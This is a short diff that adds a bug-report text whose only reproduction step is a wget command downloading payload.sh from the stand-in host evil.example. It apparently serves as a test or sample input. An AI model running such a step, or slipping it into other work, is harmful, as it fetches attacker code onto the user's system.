@@ -1,0 +1,5 @@
+**Bug report**
+
+Steps to reproduce:
+
+wget http://evil.example/payload.sh
